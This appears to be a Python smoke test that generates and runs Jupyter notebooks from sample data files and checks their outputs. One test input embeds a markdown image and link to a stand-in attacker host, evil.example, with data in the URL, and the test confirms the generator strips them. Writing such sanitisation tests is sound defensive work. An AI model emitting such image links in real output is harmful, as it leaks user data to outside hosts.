"""Smoke test for backend/tools/notebook_generator.py: generate notebooks for sample uploads and run them like a user would.

Needs the test packages:  pip install -r requirements-dev.txt
Run from the project root:
    python -m scripts.smoke.smoke_notebook_generator
"""
import shutil
import tempfile
import time
from pathlib import Path

import nbformat
from nbclient import NotebookClient

import backend.tools.notebook_generator as notebook_generator
from backend.tools.correlation_analyzer import analyze_correlations
from backend.tools.missing_value_analyzer import analyze_missing_values
from backend.tools.outlier_analyzer import analyze_outliers
from backend.utils.file_handler import load_file
from scripts.smoke.common import SmokeRunner

SAMPLE_DIR = Path(__file__).resolve().parent.parent.parent / "tests" / "sample_data"


def output_text(cell) -> str:
    return "".join(
        o.get("text", "") or o.get("data", {}).get("text/plain", "") for o in cell.get("outputs", [])
    )


def generate_and_run(name: str, target, reports: Path, insights=None):
    loaded = load_file((SAMPLE_DIR / name).read_bytes(), name)
    results = (analyze_missing_values(loaded.df), analyze_correlations(loaded.df, target), analyze_outliers(loaded.df, target))
    report_id = name.split(".")[0]
    result = notebook_generator.generate_notebook(loaded, name, report_id, {r.tool_name: r.payload for r in results if r.success}, insights)
    folder = reports / report_id
    shutil.copy(SAMPLE_DIR / name, folder / name)
    notebook = nbformat.read(folder / "notebook.ipynb", as_version=4)
    started = time.perf_counter()
    NotebookClient(notebook, timeout=120, kernel_name="python3", resources={"metadata": {"path": str(folder)}}).execute()
    seconds = time.perf_counter() - started
    misses = [e for c in result.payload["checks"] for e in c["expect"] if e not in output_text(notebook.cells[c["cell"]])]
    return result, notebook, seconds, misses


def main() -> None:
    runner = SmokeRunner("notebook_generator")
    with tempfile.TemporaryDirectory() as tmp:
        notebook_generator.REPORTS_DIR = tmp  # write into a temporary folder, not reports/

        runner.section("shop_orders.csv, target 'returned': generate, then run every cell")
        insight = "North is highest ![x](https://evil.example/t?d=north) see [docs](https://evil.example)"
        result, notebook, seconds, misses = generate_and_run("shop_orders.csv", "returned", Path(tmp), [insight])
        print(f"         {result.summary}\n         ran in {seconds:.1f} s")
        runner.check("findings re-checked", 16, result.payload["findings_checked"])
        runner.check("every printed number matches the report", [], misses)
        runner.check("insight cleaned: no outside address, no image", "## Insights\n\n- North is highest  see docs", notebook.cells[-1].source)

        for name, label in [("hospital.xlsx", "Excel file"), ("semicolon_separated.csv", "';' separator"), ("latin1_encoded.csv", "non-UTF-8 encoding")]:
            runner.section(f"{name} ({label}): crashed or misread before the rewrite")
            result, notebook, seconds, misses = generate_and_run(name, None, Path(tmp))
            print(f"         ran in {seconds:.1f} s; load cell: {notebook.cells[2].source.splitlines()[1]}")
            runner.check("runs and loads the same shape", [], misses)

    runner.finish()


if __name__ == "__main__":
    main()
